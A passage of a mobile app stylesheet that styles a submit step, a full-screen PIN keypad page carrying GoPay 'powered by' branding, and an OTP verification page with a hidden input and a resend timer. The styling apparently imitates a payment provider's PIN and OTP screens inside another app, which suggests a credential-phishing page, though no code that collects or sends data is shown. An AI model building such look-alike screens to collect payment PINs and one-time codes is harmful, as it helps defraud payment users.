  border-radius: 52rpx;
  font-size: 34rpx;
  font-weight: 600;
  color: #FFFFFF;
  border: none;
  display: flex;
  align-items: center;
  justify-content: center;
}

.sp-submit-btn::after {
  border: none;
}

/* ========== 步骤二：PIN 输入页面 ========== */
.pin-page {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: #f0f2f5;
  z-index: 9998;
  display: flex;
  flex-direction: column;
}

.pin-top-bar {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: calc(var(--status-bar-height) + 20rpx) 32rpx 20rpx;
  background: #f0f2f5;
}

.pin-close-btn {
  width: 72rpx;
  height: 72rpx;
  display: flex;
  align-items: center;
  justify-content: center;
}

.pin-close-icon {
  font-size: 36rpx;
  color: #1a1a1a;
  font-weight: 600;
}

.pin-top-title {
  font-size: 32rpx;
  font-weight: 700;
  color: #1a1a1a;
}

.pin-help-btn {
  width: 72rpx;
  height: 72rpx;
  display: flex;
  align-items: center;
  justify-content: center;
}

.pin-help-icon {
  font-size: 40rpx;
  color: #1a1a1a;
}

/* PIN 内容区域 */
.pin-content {
  flex: 1;
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 48rpx 48rpx 0;
}

.pin-subtitle {
  font-size: 32rpx;
  font-weight: 700;
  color: #1a1a1a;
  text-align: center;
  margin-bottom: 12rpx;
}

.pin-desc {
  font-size: 26rpx;
  color: #9e9e9e;
  text-align: center;
  margin-bottom: 56rpx;
}

/* PIN 圆点卡片 */
.pin-dots-card {
  background: #e8eaed;
  border-radius: 24rpx;
  padding: 48rpx 0;
  margin-bottom: 40rpx;
  width: 100%;
}

.pin-dots-row {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 48rpx;
}

.pin-dot {
  width: 36rpx;
  height: 36rpx;
  border-radius: 50%;
  border: 3rpx solid #bdbdbd;
  background: transparent;
  display: flex;
  align-items: center;
  justify-content: center;
}

.pin-dot-filled {
  border-color: #00880a;
  background: transparent;
}

.pin-dot-inner {
  width: 26rpx;
  height: 26rpx;
  border-radius: 50%;
  background: #00880a;
}

/* Login issues 标签 */
.pin-issue-tag {
  display: inline-flex;
  align-items: center;
  background: #e8f5e9;
  border-radius: 32rpx;
  padding: 12rpx 28rpx;
}

.pin-issue-text {
  font-size: 26rpx;
  font-weight: 600;
  color: #00880a;
}

/* 底部品牌 */
.pin-branding {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10rpx;
  padding: 24rpx 0;
}

.pin-powered {
  font-size: 24rpx;
  color: #9e9e9e;
}

.pin-gopay-logo {
  display: flex;
  align-items: center;
  gap: 8rpx;
}

.pin-gopay-dot {
  width: 20rpx;
  height: 20rpx;
  border-radius: 50%;
  background: #00aaef;
}

.pin-gopay-text {
  font-size: 26rpx;
  font-weight: 700;
  color: #1a1a1a;
}

/* 自定义数字键盘 */
.pin-keypad {
  background: #f0f2f5;
  padding: 0 24rpx 48rpx;
  flex-shrink: 0;
}

.keypad-row {
  display: flex;
  justify-content: center;
  gap: 16rpx;
  margin-bottom: 16rpx;
}

.keypad-row:last-child {
  margin-bottom: 0;
}

.keypad-key {
  width: 220rpx;
  height: 108rpx;
  background: #FFFFFF;
  border-radius: 16rpx;
  display: flex;
  align-items: center;
  justify-content: center;
  box-shadow: 0 2rpx 4rpx rgba(0, 0, 0, 0.06);
  transition: background-color 0.1s;

  &:active {
    background: #e0e0e0;
  }
}

.keypad-empty {
  background: transparent;
  box-shadow: none;

  &:active {
    background: transparent;
  }
}

.keypad-num {
  font-size: 48rpx;
  font-weight: 500;
  color: #1a1a1a;
}

.keypad-backspace {
  font-size: 44rpx;
  color: #1a1a1a;
}

/* ========== 步骤三：OTP 验证页面 ========== */
.otp-page {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background: #f0f2f5;
  z-index: 9998;
  display: flex;
  flex-direction: column;
}

.otp-top-bar {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: calc(var(--status-bar-height) + 20rpx) 32rpx 20rpx;
  background: #f0f2f5;
}

.otp-back-btn {
  width: 72rpx;
  height: 72rpx;
  display: flex;
  align-items: center;
  justify-content: center;
}

.otp-back-icon {
  font-size: 44rpx;
  color: #1a1a1a;
  font-weight: 600;
}

.otp-top-right {
  display: flex;
  align-items: center;
}

.otp-help-btn {
  width: 72rpx;
  height: 72rpx;
  border-radius: 50%;
//   border: 3rpx solid #1a1a1a;2
  display: flex;
  align-items: center;
  justify-content: center;
}

.otp-help-icon {
  font-size: 36rpx;
  color: #1a1a1a;
}

/* OTP 内容区域 */
.otp-page-content {
  flex: 1;
  padding: 32rpx 48rpx 0;
}

.otp-page-title {
  display: block;
  font-size: 44rpx;
  font-weight: 700;
  color: #1a1a1a;
  line-height: 1.3;
  margin-bottom: 16rpx;
}

.otp-page-desc {
  display: block;
  font-size: 28rpx;
  color: #9e9e9e;
  line-height: 1.5;
  margin-bottom: 48rpx;
}

/* OTP 输入区域 */
.otp-input-section {
  margin-bottom: 48rpx;
  position: relative;
}

.otp-input-label {
  display: block;
  font-size: 28rpx;
  color: #4a4a4a;
  margin-bottom: 24rpx;
}

.otp-input-row {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding-bottom: 16rpx;
}

.otp-dots-area {
  display: flex;
  align-items: center;
  gap: 12rpx;
  flex: 1;
  min-height: 48rpx;
}

.otp-entered-dot {
  font-size: 36rpx;
  color: #9e9e9e;
  line-height: 1;
}

.otp-cursor {
  width: 4rpx;
  height: 36rpx;
  background: #1a1a1a;
  animation: otpBlink 1s step-end infinite;
}

@keyframes otpBlink {
  0%, 100% { opacity: 1; }
  50% { opacity: 0; }
}

.otp-timer-area {
  display: flex;
  align-items: center;
  gap: 12rpx;
  flex-shrink: 0;
}

.otp-loading-spinner {
  width: 32rpx;
  height: 32rpx;
  border: 4rpx solid #e0e0e0;
  border-top-color: #00880a;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

.otp-countdown {
  font-size: 32rpx;
  font-weight: 700;
  color: #1a1a1a;
}

.otp-resend {
  flex-shrink: 0;
}

.otp-resend-text {
  font-size: 28rpx;
  font-weight: 600;
  color: #00880a;
  text-decoration: underline;
}

.otp-input-line {
  height: 2rpx;
  background: #e0e0e0;
}

.otp-hidden-input {
  position: absolute;
  left: -9999rpx;
  top: 0;
  width: 1rpx;
  height: 1rpx;
  opacity: 0;
}

/* OTP issue 标签 */
.otp-issue-tag {
  display: inline-flex;
  align-items: center;
  background: #e8f5e9;
  border-radius: 32rpx;
  padding: 14rpx 32rpx;
  margin-top: 16rpx;
}

.otp-issue-text {
  font-size: 28rpx;
  font-weight: 600;
  color: #1a1a1a;
}
</style>
